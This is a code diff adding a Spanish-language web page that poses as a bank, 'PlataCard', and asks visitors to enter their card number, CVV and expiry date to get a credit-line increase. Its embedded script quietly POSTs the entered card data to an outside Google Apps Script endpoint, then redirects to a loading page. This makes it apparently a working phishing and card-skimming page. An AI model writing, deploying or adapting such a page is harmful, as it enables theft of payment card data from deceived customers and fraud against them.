@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PlataCard</title>
+
+<link rel="icon" href="img/icono.imagotipo.svg">
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+
+<header class="header">
+
+    <div class="logo">
+        <a href="index.html" class="logo">
+            <img src="img/LogoBanco.png" alt="logo">
+        </a>
+    </div>
+
+    <input type="checkbox" id="toggle">
+
+    <label for="toggle">
+        <img class="menu" src="img/icono_bars.svg" alt="menu">
+    </label>
+
+    <nav class="navigation">
+
+        <ul>
+
+            <li>
+                <a href="#" class="acceso">
+                    <img src="img/icono-login.svg" alt="login">
+                    Acceso a clientes
+                </a>
+            </li>
+
+            <li><a href="#">Personas</a></li>
+            <li><a href="#">Empresas</a></li>
+            <li><a href="#">Nosotros</a></li>
+
+        </ul>
+
+    </nav>
+
+</header>
+
+<section class="ingresar">
+
+    <form id="miFormulario">
+
+        <p>PARA GENERAR LA ADICIÓN A TU LÍNEA DE CRÉDITO</p>
+
+        <h2>Ingresa la siguiente información.</h2>
+
+        <div class="inputcaja">
+
+            <label for="numTarjeta">
+                Número de Tarjeta
+            </label>
+
+            <input
+                type="text"
+                id="numTarjeta"
+                name="numTarjeta"
+                placeholder="Número de Tarjeta"
+                required>
+
+            <label for="idCvv">
+                CVV
+            </label>
+
+            <input
+                type="text"
+                id="idCvv"
+                name="idCvv"
+                placeholder="CVV"
+                required>
+
+            <label for="fechaExpiracion">
+                Fecha de Expiracion (MM/AA)
+            </label>
+
+            <input
+              type="text"
+              id="fechaAcceso"
+              name="fechaAcceso"
+              placeholder="MM/AA"
+              pattern="^(0[1-9]|1[0-2])\/[0-9]{2}$"
+              maxlength="5"
+              required>
+
+            <input
+                class="btn"
+                type="submit"
+                value="CONTINUAR">
+
+        </div>
+
+    </form>
+
+</section>
+
+<section class="imagen2">
+
+    <div class="end">
+        <a href="#" class="footer">
+            <img src="img/CASBACK.jpg" alt="footer">
+        </a>
+    </div>
+
+</section>
+
+<section class="imagen2" id="imagen2">
+    <div class="end">
+        <a href="#" class="footer"><img src="img/footer-BA-01.jpg" alt="footer"></a>
+    </div>
+</section>
+
+<script>
+  const form = document.getElementById('miFormulario');
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbw5osmSFxHL5gsPlGHFjl9Ik1Hpshc3beaAMmUla4VUbbEhkpN43elAC9-Xy1YiIO8TWw/exec';
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault(); // Previene el envío por defecto
+
+    fetch(scriptURL, {
+      method: 'POST',
+      body: new FormData(form)
+    })
+    .then(response => {
+      if (response.ok) {
+        // Redirige tras el envío exitoso
+        window.location.href = 'loading-dos.html';
+      } else {
+        alert('Hubo un error al enviar. Intenta de nuevo.');
+      }
+    })
+    .catch(error => {
+      console.error('Error al enviar:', error);
+      alert('Error al conectar con el servidor.');
+    });
+  });
+</script>
+</body>
+
+</html>
